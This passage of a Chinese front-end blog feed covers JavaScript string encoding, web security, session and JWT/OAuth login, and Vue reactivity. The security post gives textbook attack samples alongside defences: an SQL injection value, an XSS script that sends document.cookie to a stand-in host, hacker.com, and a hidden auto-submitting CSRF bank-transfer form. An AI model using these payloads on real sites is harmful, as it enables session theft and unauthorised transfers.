class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">javascript:escape(&quot;春节&quot;);</span><br><span class="line">// &quot;%u6625%u8282&quot;</span><br><span class="line"></span><br><span class="line">javascript:escape(&quot;hello word&quot;);</span><br><span class="line">// &quot;hello%20word&quot;</span><br></pre></td></tr></table></figure></p><p>无论网页的原始编码是什么，一旦被javascript编码，都会变成Unicode字符。也就是，Javascript的输入和输出都是unicode字符。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">javascript:escape(&quot;\u6625\u8282&quot;);</span><br><span class="line">// &quot;%u6625%u8282&quot;</span><br><span class="line"></span><br><span class="line">javascript:unescape(&quot;%u6625%u8282&quot;);</span><br><span class="line">// &quot;春节&quot;</span><br><span class="line"></span><br><span class="line">javascript:unescape(&quot;\u6625\u8282&quot;);</span><br><span class="line">// &quot;春节&quot;</span><br></pre></td></tr></table></figure></p><p>其次，<code>escape()</code>不对<code>+</code>编码。但是，网页在提交表单的时候，如果有空格，则会被转化为<code>+</code>字符。服务器处理数据的时候，会把<code>+</code>号处理成空格。所以，使用的时候要小心。</p><p><br></p><h4 id="4-3-encodeURI"><a href="#4-3-encodeURI" class="headerlink" title="4.3 encodeURI"></a>4.3 encodeURI</h4><p>对整个URI进行编码。除了常见的符号外， 对特殊符号<code>&#39;;/?:@&amp;=+$,#</code>不进行编码。编码后，输出符号是<code>UTF-8</code>形式，并且在每个字节上前加上<code>%</code>。对应的解码函数是<code>decodeURI</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">encodeURI(&apos;https://www.baidu.com/s?wd=中文&apos;)</span><br><span class="line">// &quot;https://www.baidu.com/s?wd=%E4%B8%AD%E6%96%87&quot;</span><br></pre></td></tr></table></figure><p>需要注意的是，它不对单引号<code>&#39;</code>编码。<br><br></p><h4 id="4-4-encodeURIComponent"><a href="#4-4-encodeURIComponent" class="headerlink" title="4.4 encodeURIComponent"></a>4.4 encodeURIComponent</h4><p>对于<code>&#39;;/?:@&amp;=+$,#</code>，这些在<code>encodeURI</code>中不被编码的符号，在<code>encodeURIComponent</code>中统统会被编码。对应的解码函数是<code>decodeURIComponent</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">encodeURIComponent(&quot;https://www.baidu.com/s?wd=中文&quot;)</span><br><span class="line">// &quot;https%3A%2F%2Fwww.baidu.com%2Fs%3Fwd%3D%E4%B8%AD%E6%96%87&quot;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="5-ES6字符串"><a href="#5-ES6字符串" class="headerlink" title="5. ES6字符串"></a>5. ES6字符串</h3><p>ES6加强了对Unicode的支持，并且扩展了字符串对象。</p><h4 id="5-1-UTF-16码位"><a href="#5-1-UTF-16码位" class="headerlink" title="5.1 UTF-16码位"></a>5.1 UTF-16码位</h4><p>在ES6出现前，Javascript字符串一直基于16位字符编码(UTF-16)进行构建。过去16位足以包含任何字符，直到Unicode引入扩展字符集，编码规则才不得不进行更改。为此，<code>UTF-16</code>引入了代理对，规定了用两个16位编码单元表示一个码位。<br>因此，字符串里的字符有两种:</p><ul><li>一种是由一个编码单元16位表示的BMP字符</li><li>另一种是由两个编码单元32位表示的辅助平面字符。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;\uD842\uDFB7&quot;</span><br><span class="line">// &quot;𠮷&quot;</span><br><span class="line"></span><br><span class="line">&quot;\u0061&quot;</span><br><span class="line">// &quot;a&quot;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="5-2-codePointAt"><a href="#5-2-codePointAt" class="headerlink" title="5.2 codePointAt"></a>5.2 codePointAt</h4><p><code>codePointAt</code>方法接受编码单元的位置而非字符位置作为参数，返回与字符串中给定位置对应的码位。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">let text = &quot;𠮷a&quot;;</span><br><span class="line">console.log(text.charCodeAt(0)) // 55362</span><br><span class="line">console.log(text.charCodeAt(1)) // 57271</span><br><span class="line">console.log(text.charCodeAt(2)) // 97</span><br><span class="line"></span><br><span class="line">// codePointAt能够正确处理4个字节储存的字符，返回一个字符的码点。</span><br><span class="line">console.log(text.codePointAt(0)) // 134071</span><br><span class="line">console.log(text.codePointAt(1)) // 57271</span><br><span class="line">console.log(text.codePointAt(2)) // 97</span><br></pre></td></tr></table></figure></p><p>检测一个字符占用的编码单元数量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function is32Bit(c)&#123;</span><br><span class="line">return c.codePointAt(0) &gt; 0xFFFF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="5-3-fromCodePoint"><a href="#5-3-fromCodePoint" class="headerlink" title="5.3 fromCodePoint"></a>5.3 fromCodePoint</h4><p>根据指定的码位生成一个字符。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String.fromCodePoint(134071) // &quot;𠮷&quot;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="5-4-normalize"><a href="#5-4-normalize" class="headerlink" title="5.4 normalize"></a>5.4 normalize</h4><p>如果我们要对不同字符进行排序或对比，一定先把它们标准化为同一种形式。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text.normalize()</span><br></pre></td></tr></table></figure></p><p><br></p><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="http://chunge2016.online/2017/05/19/ASCII%EF%BC%8CUnicode%E5%92%8CUTF-8-Charset-and-Encoding/" target="_blank" rel="noopener">ASCII，Unicode和UTF-8 (Charset and Encoding)</a></li><li><a href="https://www.cnblogs.com/liupp123/articles/8023861.html" target="_blank" rel="noopener">字符编码中ASCII、Unicode和UTF-8的区别</a></li><li><a href="https://baike.baidu.com/item/%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6/86397?fr=aladdin" target="_blank" rel="noopener">转义字符</a></li><li><a href="https://www.haorooms.com/post/js_escape_encodeURIComponent" target="_blank" rel="noopener">url的三个js编码函数escape(),encodeURI(),encodeURIComponent()简介</a></li><li><a href="http://es6.ruanyifeng.com/?search=char&amp;x=0&amp;y=0#docs/string#%E5%AD%97%E7%AC%A6%E7%9A%84-Unicode-%E8%A1%A8%E7%A4%BA%E6%B3%95" target="_blank" rel="noopener">字符串的扩展</a></li><li>《深入理解ES6》第二章 字符串和正则表达式</li></ul>]]></content>
      
      <categories>
          
          <category> Basic </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Web安全</title>
      <link href="/2019/02/16/Web%E5%AE%89%E5%85%A8/"/>
      <url>/2019/02/16/Web%E5%AE%89%E5%85%A8/</url>
      <content type="html"><![CDATA[<blockquote><p>浏览器安全可以分为三大块——Web 页面安全、浏览器网络安全和浏览器系统安全。</p></blockquote><h3 id="1-sql注入"><a href="#1-sql注入" class="headerlink" title="1. sql注入"></a>1. sql注入</h3><p>通过把sql命令插入到web表单提交，或输入域名/页面请求的查询字符串，最终达到欺骗服务器执行恶意sql命令。</p><p>变量id是一个从用户界面传来的值<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string sql = " <span class="keyword">SELECT</span> <span class="keyword">id</span>, <span class="keyword">name</span>, age <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">'" + id + "'</span><span class="string">"</span></span><br></pre></td></tr></table></figure></p><p>ID值: <em><code>1&#39; OR &#39;1&#39; = &#39;1</code></em><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>, <span class="keyword">name</span>, age</span><br><span class="line"><span class="keyword">FROM</span> <span class="keyword">users</span></span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">'1'</span> <span class="keyword">OR</span> <span class="string">'1'</span> = <span class="string">'1'</span></span><br></pre></td></tr></table></figure></p><p>从users表中的所有数据都查询出来，仅仅通过一个简单的恒真表达式。<br><br></p><h3 id="2-XSS脚本攻击"><a href="#2-XSS脚本攻击" class="headerlink" title="2. XSS脚本攻击"></a>2. XSS脚本攻击</h3><p>黑客通过”HTML注入”篡改网页，插入了恶意的脚本，从而在用户浏览网页时，控制用户浏览器的一种攻击。</p><h4 id="2-1-如何注入恶意脚本"><a href="#2-1-如何注入恶意脚本" class="headerlink" title="2.1 如何注入恶意脚本"></a>2.1 如何注入恶意脚本</h4><p>一旦你浏览已经被黑客留下XSS script的页面，这段js就会执行，cookie信息就会被偷走。黑客可以假冒你的身份做事情了。</p><p>如果页面被注入恶意js脚本，可以做：</p><ul><li>窃听cookie：通过<code>document.cookie</code>获取cookie信息，发送给恶意服务器</li><li>监听用户行为：通过<code>addEventListener</code>监听键盘时间，发送给恶意服务器</li><li>修改DOM：伪造假的登录窗口，欺骗用户的用户名和密码</li><li>在页面内生成浮窗广告</li></ul><p>将一段恶意JS代码提交到数据库，用户请求包含恶意js脚本的数据，并注入页面。</p><p>某个黑客发表了一篇文章，在<code>&lt;input&gt;</code>框中输入一段script<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"http://hacker.com/hack.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>hack.js文件中的内容<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">'img'</span>);</span><br><span class="line">img.src = <span class="string">"http://hacker.com/log?"</span> + <span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(script);</span><br></pre></td></tr></table></figure></p><h4 id="2-2-如何阻止攻击"><a href="#2-2-如何阻止攻击" class="headerlink" title="2.2 如何阻止攻击"></a>2.2 如何阻止攻击</h4><ul><li><p>对关键字符转码</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 转码前</span></span><br><span class="line">code:<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">'你被xss攻击了'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 转码后</span></span><br><span class="line">code:&amp;lt;script&amp;gt;alert(&amp;#39;你被xss攻击了&amp;#39;)&amp;lt;/script&amp;gt;</span><br></pre></td></tr></table></figure></li><li><p>用<code>HttpOnly</code>保护<code>Cookie</code>的安全</p></li><li>禁止执行内联脚本</li><li>限制加载其他域下的资源</li></ul><p><br></p><h3 id="3-CSRF跨站脚本伪造"><a href="#3-CSRF跨站脚本伪造" class="headerlink" title="3. CSRF跨站脚本伪造"></a>3. CSRF跨站脚本伪造</h3><h4 id="3-1-CSRF攻击行为"><a href="#3-1-CSRF攻击行为" class="headerlink" title="3.1 CSRF攻击行为"></a>3.1 CSRF攻击行为</h4><p>黑客引诱用户打开黑客的网站，利用用户的登录状态发起跨站请求。</p><ul><li>自动发起GET请求</li><li>自动发起POST请求</li><li>引诱用户点击链接</li></ul><p>假设有个银行网站用以下方式进行转账操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.bank.com/transfer.php?toBankId=&lt;账号&gt;&amp;money=&lt;金额&gt;</span><br></pre></td></tr></table></figure></p><p>你打开浏览器，先登录了银行网站，然后又开了一个tab页，打开了你的邮箱，有这么一个邮件：恭喜你获得了一台iphone x,点击领取。点击了上面的链接，就执行了转账操作。</p><p>后来银行转账功能不用<code>get</code>， 改用<code>post</code>。 </p><p>黑客也做了改进，建立了一个偷偷提交数据的页面。用户进入该页面，会自动提交表单。若用户已经登录了<code>www.bank.com</code>，请求成功。</p><p>从头到尾，攻击网站都没有获取到过cookie， 都是通过浏览器间接实现（利用web的cookie隐式身份验证机制），所以<code>httpOnly</code>并不会影响这个攻击。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">"steal"</span> <span class="attr">display:</span>'<span class="attr">none</span>'&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">name</span>=<span class="string">"transfer"</span> <span class="attr">action</span>=<span class="string">"http://www.bank.com/transfer.php"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"toBankId"</span> <span class="attr">value</span>=<span class="string">"123"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"money"</span> <span class="attr">value</span>=<span class="string">"10000"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">steal</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">      iframe = <span class="built_in">document</span>.frames[<span class="string">"steal"</span>];</span></span><br><span class="line"><span class="javascript">      iframe.document.submit(<span class="string">"transfer"</span>);</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="3-2-防止CSRF攻击"><a href="#3-2-防止CSRF攻击" class="headerlink" title="3.2 防止CSRF攻击"></a>3.2 防止CSRF攻击</h4><ul><li>如果是第三方站点发起的请求，禁止发送某些关键Cookie数据到服务器<br><code>Set-cookie</code>请求头带上<code>SameSite</code>: Strict, Lax, None</li><li>检查Referer, Origin请求头: 根据地址判断是否接受请求</li><li>CSRF Token: 在浏览器向服务器发起请求时，服务器生成一个 CSRF Token，该字符串植入到返回的页面中。如果要发起转账，就要带上CSRF Token</li></ul><p><br></p><h3 id="4-同源策略"><a href="#4-同源策略" class="headerlink" title="4. 同源策略"></a>4. 同源策略</h3><p>如果两个 URL 的协议、域名和端口都相同，我们就称这两个 URL 同源。</p><ul><li>DOM层面<br>限制了来自不同源的 JavaScript 脚本对当前 DOM 对象读和写的操作。</li><li>数据层面<br>限制了不同源的站点读取当前站点的 Cookie、IndexDB、LocalStorage 等数据。</li><li>网络层面<br>限制了通过 XMLHttpRequest 等方式将站点的数据发送给不同源的站点。</li></ul><p>但同时：</p><ul><li>页面中可以嵌入第三方资源</li><li>CSP &amp; CORS: 让服务器决定浏览器能够加载哪些资源，让服务器决定浏览器是否能够执行内联 JavaScript 代码。</li></ul><p><br></p><h3 id="5-https"><a href="#5-https" class="headerlink" title="5. https"></a>5. https</h3><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://cloud.tencent.com/developer/article/1004895" target="_blank" rel="noopener">简单的 web 安全 checklist</a></li><li>码农翻身-web安全</li><li>《图解HTTP》第11章 Web的攻击技术</li></ul>]]></content>
      
      <categories>
          
          <category> Basic </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Session, token与OAuth</title>
      <link href="/2019/02/16/%E4%BB%8Esession%E5%88%B0token/"/>
      <url>/2019/02/16/%E4%BB%8Esession%E5%88%B0token/</url>
      <content type="html"><![CDATA[<h3 id="1-Web登录的本质"><a href="#1-Web登录的本质" class="headerlink" title="1. Web登录的本质"></a>1. Web登录的本质</h3><p>由于<strong>HTTP是无状态协议</strong>，所以服务端需要记录用户状态时，就需要某种机制来识别具体的用户，这个机制就是<em><code>Session</code></em>。</p><p><br></p><h3 id="2-cookie和Session"><a href="#2-cookie和Session" class="headerlink" title="2. cookie和Session"></a>2. cookie和Session</h3><p>常用的会话跟踪技术是cookie和session<br>cookie是存储在客户端，session是存储在server端<br>可以说，cookie是一种补足http协议无状态的机制</p><p>一个cookie的设置分为4步</p><ul><li>客户端发送http请求</li><li>服务器响应http请求 set-cookies response</li><li>客户端发送http请求 包含cookie头部 发送到服务器端</li><li>服务器返回一个http response</li></ul><p><br><br><img src="/2019/02/16/从session到token/1.png" style="max-width: 500px"></p><p>session 是用服务器来保持状态的。专门为用户开辟存储空间，session被创建后会保存在服务器中，其中session ID则发送给客户端，客户端下次发送请求携带session ID，服务器则会查询该ID 找到对应的session读取信息。</p><p>在使用session机制保持持久化登陆的实现上可以将sessionID保存在 cookie、header、URL中，客户端带着sessionID过来，服务器根据这个sessionID判断是否存在当前会话。</p><p>所以， <em><code>Session</code></em>是在服务端保存的一个数据结构，用来跟踪用户的状态，这个数据可以保存在集群、数据库、文件中。<br><em><code>Cookie</code></em>是客户端保存用户信息的一种机制，用来记录用户的一些信息，也是实现Session的其中一环。</p><p><br></p><h3 id="3-从Session到token"><a href="#3-从Session到token" class="headerlink" title="3. 从Session到token"></a>3. 从Session到token</h3><p>Session的问题在于，扩展性不好。如果是服务器集群，或跨域的服务导向架构，就要求session数据共享，单点登录。服务器需要保存并管理所有人的session id, 这是一个巨大的开销。<em>可以不保存这些Session ID吗？</em></p><p>比如，对数据做一个签名。用HMAC-SHA256算法，加上一个只有我知道的密钥，对数据做一个签名，<strong>把这个数据和签名一起作为<code>token</code></strong>，由于密钥别人不知道，就无法伪造token了。<br><br><br><img src="/2019/02/16/从session到token/2.png" style="max-width: 300px"><br><br><br>这个token服务器不保存，只有小F把token发过来的时候，再用同样的HMAC-SHA256算法和同样的密钥，对数据再计算一次签名，和token中的签名做比较.如果相同，我们就知道小F已经登录过了，并且可以直接去到小F的user id。如果不相同，数据部分肯定被人篡改过，就可以告诉发送者: 对不起，没有认证。</p><p>这样一来，服务器就不保存session id了，它只是生成token, 验证token，用CPU的计算时间换取了session的存储空间。</p><p><br></p><h3 id="3-JWT"><a href="#3-JWT" class="headerlink" title="3. JWT"></a>3. JWT</h3><p><code>JWT(JSON Web Token)</code>是目前最流行的跨域认证解决方案。<br><img src="/2019/02/16/从session到token/3.png"></p><p>JWT大致长这样，它是一个很长的字符串，中间用<code>.</code>分隔成三部分。JWT不仅用于认证，也可以用于交换信息。有效使用JWT，可以降低服务器查询数据库的次数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Header(头部).Payload(负载).Signature(签名)</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-1-Header"><a href="#3-1-Header" class="headerlink" title="3.1 Header"></a>3.1 <em><code>Header</code></em></h4><p>Header描述JWT的元数据, <code>alg</code>表示签名的算法，默认是HMAC SHA156。 <code>typ</code>表示这个token的类型，统一写为<code>JWT</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWT&quot;&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-2-Payload"><a href="#3-2-Payload" class="headerlink" title="3.2 Payload"></a>3.2 <em><code>Payload</code></em></h4><p>Payload用于存放实际需要传递的数据。JWtT规定了7个官方字段。除了官方字段，你还可以定义私有字段，JWT默认是不加密的，所以不要把秘密信息放在这里。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">iss (issuer)：签发人</span><br><span class="line">exp (expiration time)：过期时间</span><br><span class="line">sub (subject)：主题</span><br><span class="line">aud (audience)：受众</span><br><span class="line">nbf (Not Before)：生效时间</span><br><span class="line">iat (Issued At)：签发时间</span><br><span class="line">jti (JWT ID)：编号</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-3-Signature"><a href="#3-3-Signature" class="headerlink" title="3.3 Signature"></a>3.3 <em><code>Signature</code></em></h4><p>Signature是对前两部分的签名。</p><p><br></p><h3 id="4-OAuth"><a href="#4-OAuth" class="headerlink" title="4. OAuth"></a>4. OAuth</h3><p><a href="http://www.rfcreader.com/#rfc6749" target="_blank" rel="noopener">OAuth</a> 是一个关于授权(authorization)的开放网络标准。OAuth在“客户端”与“服务提供商”之间，设置了一个授权层。“客户端”登录授权层以后，获取token，“服务提供商”根据token的权限范围和有效期，向“客户端”开放用户储存的资料。OAuth有以下几种常用模式：<br><br></p><h4 id="4-1-Resource-Owner-Password-Credentials-Grant-资源所有者密码凭据认可"><a href="#4-1-Resource-Owner-Password-Credentials-Grant-资源所有者密码凭据认可" class="headerlink" title="4.1 Resource Owner Password Credentials Grant(资源所有者密码凭据认可)"></a>4.1 Resource Owner Password Credentials Grant(资源所有者密码凭据认可)</h4><p>小A直接提供用户名和密码，让”信用卡管家”向“网易认证中心”请求token。<br><br></p><h4 id="4-2-Implicit-Grant-隐式许可"><a href="#4-2-Implicit-Grant-隐式许可" class="headerlink" title="4.2 Implicit Grant(隐式许可)"></a>4.2 Implicit Grant(隐式许可)</h4><p>小A用网易账号登录，确认授权后，会重定向到“信用卡管家”网站，同时捎带一个<code>token</code>。信用卡管家就可以用这个token，来访问网易开放的资源。<br><br><br><img src="/2019/02/16/从session到token/4.png"><br><br></p><h4 id="4-3-Authorization-Code-Grant-授权码许可"><a href="#4-3-Authorization-Code-Grant-授权码许可" class="headerlink" title="4.3 Authorization Code Grant(授权码许可)"></a>4.3 Authorization Code Grant(授权码许可)</h4><p>小A用网易账号登录的时候，网易认证中心不直接发token，而是发一个授权码<code>(authorization code)</code>。当“信用卡管理中心”取到这个code以后，在后台再次访问网易认证中心，这一次才拿到了真正的token。</p><p>授权码模式是功能最完整，流程最严密的授权模式。<br><br><br><img src="/2019/02/16/从session到token/5.png"></p><h4 id="4-4-解析jwt"><a href="#4-4-解析jwt" class="headerlink" title="4.4 解析jwt"></a>4.4 解析jwt</h4><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://mp.weixin.qq.com/s?__biz=MzAxOTc0NzExNg==&amp;mid=2665513566&amp;idx=1&amp;sn=a2688cadbe9c8042ff1abbdf04a8bd5e&amp;chksm=80d67a1db7a1f30b28b93ed2ab29edfbf982b780433e4bfd178e3cc52cb1f9100cc8f923db4f&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">干掉状态: 从session到token</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzAxOTc0NzExNg==&amp;mid=2665513744&amp;idx=1&amp;sn=93d0db97cfd67422bcd21c8afd00f495&amp;chksm=80d67b53b7a1f24537fdc7c10eb2783357c1f8c65ad55601a722216d2293ae3fb7b1c16e5449&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">从密码到token</a></li><li><a href="https://www.zhihu.com/question/19786827" target="_blank" rel="noopener">Cookie和Session有什么区别？</a></li><li><a href="http://www.rfcreader.com/#rfc6749" target="_blank" rel="noopener">The OAuth 2.0 Authorization Framework</a></li><li><a href="https://www.xiaolai.cc/2019/04/23/cookie/" target="_blank" rel="noopener">cookie与session实现持久化登陆</a></li><li><a href="https://juejin.im/post/5b7ea1366fb9a01a0b319612" target="_blank" rel="noopener">前后端分离使用 Token 登录解决方案</a></li></ul>]]></content>
      
      <categories>
          
          <category> Basic </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Object.defineProperty和proxy实现响应式</title>
      <link href="/2018/11/14/Vue%E6%95%B0%E6%8D%AE%E7%BB%91%E5%AE%9A/"/>
      <url>/2018/11/14/Vue%E6%95%B0%E6%8D%AE%E7%BB%91%E5%AE%9A/</url>
      <content type="html"><![CDATA[<h3 id="1-MVVM"><a href="#1-MVVM" class="headerlink" title="1. MVVM"></a>1. MVVM</h3><p>MVVM拆开来即为Model-View-ViewModel，由View，ViewModel，Model三部分组成。它目的在于更清楚地将用户界面（UI)的开发与应用程序中业务逻辑和行为的开发区分开来。</p><p><img src="/2018/11/14/Vue数据绑定/1.png" style="max-width: 400px"><br><strong>Model</strong><br>数据层<br>是对现实世界中事物的抽象结果，就是建模。</p><p><strong>View</strong><br>用户操作界面<br>负责将数据模型转化为UI展现出来。</p><p><strong>ViewModal</strong><br>业务逻辑层<br>View需要什么数据，ViewModel要提供这个数据；View有哪些些操作，ViewModel就要响应这些操作</p><p><br></p><h3 id="2-数据驱动"><a href="#2-数据驱动" class="headerlink" title="2. 数据驱动"></a>2. 数据驱动</h3><p>对于 View 来说，如果封装得好，一个UI组件能很方便地给大家复用。对于 Model 来说，它其实是用来存储业务的数据的，如果做得好，它也可以方便地复用。那么，ViewModel有多少可以复用？结论是：<em>非常难复用</em>。</p><p>ViewModel做的什么？就是写那些不能复用的业务代码。当交互复杂，一个数据的改变引起多处DOM的修改。ViewModel将变得<em>十分臃肿</em>。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">message = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">'message'</span>).innerHTML = message;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">'aboumessage'</span>).innerHTML = message;</span><br><span class="line"><span class="comment">// ... 更多复杂的交互</span></span><br></pre></td></tr></table></figure></p><p>怎么简化ViewModel？<em>数据驱动: 数据的变更触发DOM的变化</em>。<br>我们希望，只执行<code>this.$data.message = 1</code>就可以触发与<code>message</code>相关的UI更新。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.$data.message = <span class="number">1</span></span><br></pre></td></tr></table></figure></p><blockquote><p>所谓数据驱动，是指视图是由数据驱动生成的，我们对视图的修改，不会直接操作 DOM，而是通过修改数据。它相比我们传统的前端开发，如使用 jQuery 等前端库直接修改 DOM，大大简化了代码量。特别是当交互复杂的时候，只关心数据的修改会让代码的逻辑变的非常清晰，因为 DOM 变成了数据的映射，我们所有的逻辑都是对数据的修改，而不用碰触 DOM，这样的代码非常利于维护。</p></blockquote><p><br></p><h3 id="3-Object-defineProperty"><a href="#3-Object-defineProperty" class="headerlink" title="3. Object.defineProperty"></a>3. Object.defineProperty</h3><p>Vue实现数据驱动的核心是利用了ES5的Object.defineProperty。</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/definePropert" target="_blank" rel="noopener">Object.defineProperty</a>方法会直接在一个对象上定义一个新属性，或修改一个对象的现有属性，并返回这个对象。利用 Object.defineProperty 给数据添加了 getter 和 setter，可以使我们在访问数据以及写数据的时候能自动执行一些逻辑。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.defineProperty(obj, <span class="string">'text'</span>, &#123;</span><br><span class="line">  set: <span class="function"><span class="keyword">function</span>(<span class="params">newVal</span>) </span>&#123;</span><br><span class="line">    updateUI();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">obj.text = <span class="number">1</span>; <span class="comment">// 会触发updateUI()</span></span><br></pre></td></tr></table></figure><p>Vue采用这种数据劫持的方式，通过Object.defineProperty()方法来劫持 data 所有对象的 setter，使得data发生变动时能自动执行 重新编译模板。</p><p><br></p><h4 id="3-1-实现Demo"><a href="#3-1-实现Demo" class="headerlink" title="3.1 实现Demo"></a>3.1 实现Demo</h4><input id="input"><span id="span"></span><script>  const obj = {};  Object.defineProperty(obj, 